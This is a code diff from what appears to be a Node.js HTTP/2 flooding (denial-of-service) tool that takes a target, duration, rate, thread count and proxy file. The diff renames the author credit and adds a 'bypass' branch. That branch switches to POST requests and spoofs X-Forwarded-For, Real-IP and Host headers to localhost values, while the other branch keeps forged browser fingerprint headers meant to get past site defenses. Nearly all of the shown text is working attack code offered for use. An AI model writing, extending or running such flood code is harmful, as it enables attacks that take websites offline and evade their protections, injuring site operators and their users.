@@ -21,7 +21,7 @@ process.on("unhandledRejection", errorHandler);
  if (process.argv.length < 7){
  console.log(`
 
-ReMade By @Rex_Sulsel`);
+ReMade By @Codesyntax`);
  console.log(`Usage: target time rate thread proxyfile`);
  process.exit();}
  const headers = {};
@@ -3000,33 +3000,50 @@ const rateHeaders2 = [
  }
 var hd={}
  const Socker = new NetSocket();
- headers[":method"] = "GET";
-//headers["origin"] = `https://${parsedTarget.host}`;
-headers[":path"] = `${parsedTarget.path}?${randstr(5)}=${randstr(25)}`;
-headers[":scheme"] = "https";
-headers["x-forwarded-proto"] = "https";
-headers["accept-language"] = lang;
-headers["accept-encoding"] = encoding;
-headers["X-Forwarded-For"] = spoofed;
-headers["X-Forwarded-Host"] = spoofed;
-headers["X-Custom-Header"] = "BypassedRequest";
-headers["Real-IP"] = spoofed;
-headers["cache-control"] = control;
-headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
-headers["sec-ch-ua-mobile"] = "?0";
-headers["sec-ch-ua-platform"] = pi;
-headers["referer"] = `https://${parsedTarget.host}/`;
-headers["upgrade-insecure-requests"] = "1";
-headers["accept"] = accept;
-headers["user-agent"] = uap1;
-headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
-headers["sec-fetch-dest"] = "document";
-headers["sec-fetch-mode"] = "navigate";
-headers["sec-fetch-site"] = "same-origin";
-headers["TE"] = "trailers";
-headers["Trailer"] = "Max-Forwards";
-headers["sec-fetch-user"] = "?1";
-headers["x-requested-with"] = "XMLHttpRequest";
+ // Logika bypass
+if (bypass) {
+    headers[":method"] = "POST"; // Mengubah metode jika bypass aktif
+    headers[":path"] = `${parsedTarget.path}?bypass=true&${randstr(5)}=${randstr(25)}`;
+    headers["x-forwarded-proto"] = "http"; // Bypass ke HTTP
+    headers["accept-language"] = "en-US";
+    headers["accept-encoding"] = "gzip, deflate";
+    headers["X-Forwarded-For"] = "127.0.0.1"; // IP bypass
+    headers["X-Forwarded-Host"] = "localhost";
+    headers["X-Custom-Header"] = "BypassAttempt";
+    headers["Real-IP"] = "127.0.0.1";
+    headers["cache-control"] = "no-store";
+    headers["referer"] = `http://${parsedTarget.host}/bypass`;
+    headers["user-agent"] = "BypassUserAgent/1.0";
+    headers["User-Agent"] = "BypassUserAgent/1.0";
+} else {
+    headers[":method"] = "GET";
+    // headers["origin"] = `https://${parsedTarget.host}`;
+    headers[":path"] = `${parsedTarget.path}?${randstr(5)}=${randstr(25)}`;
+    headers[":scheme"] = "https";
+    headers["x-forwarded-proto"] = "https";
+    headers["accept-language"] = lang;
+    headers["accept-encoding"] = encoding;
+    headers["X-Forwarded-For"] = spoofed;
+    headers["X-Forwarded-Host"] = spoofed;
+    headers["X-Custom-Header"] = "BypassedRequest";
+    headers["Real-IP"] = spoofed;
+    headers["cache-control"] = control;
+    headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
+    headers["sec-ch-ua-mobile"] = "?0";
+    headers["sec-ch-ua-platform"] = pi;
+    headers["referer"] = `https://${parsedTarget.host}/`;
+    headers["upgrade-insecure-requests"] = "1";
+    headers["accept"] = accept;
+    headers["user-agent"] = uap1;
+    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
+    headers["sec-fetch-dest"] = "document";
+    headers["sec-fetch-mode"] = "navigate";
+    headers["sec-fetch-site"] = "same-origin";
+    headers["TE"] = "trailers";
+    headers["Trailer"] = "Max-Forwards";
+    headers["sec-fetch-user"] = "?1";
+    headers["x-requested-with"] = "XMLHttpRequest";
+}
  
  
  function runFlooder() {
